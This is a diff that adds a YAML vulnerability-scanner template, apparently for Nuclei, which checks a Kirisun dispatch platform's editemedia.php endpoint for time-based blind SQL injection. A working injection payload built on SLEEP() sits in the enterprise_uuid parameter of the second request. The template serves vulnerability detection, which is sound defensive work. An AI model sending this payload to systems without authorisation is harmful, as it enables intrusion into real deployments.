@@ -1,0 +1,53 @@
+id: poc-yaml-kirisun-editemedia-sqli
+
+info:
+  name: 福建科立讯通信指挥调度平台editemedia.php SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /api/client/editemedia.php HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "code"
+          - "msg"
+      - type: dsl
+        dsl:
+          - "duration <= 5"
+
+  - raw:
+      - |
+        GET /api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP({{t1}})))JPVs)%20AND%20%27gDyM%27=%27gDyM HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":"-1"'
+          - '"msg":"user not found"'
+      - type: dsl
+        dsl:
+          - "duration >= t1"
+          - "duration <= t2"
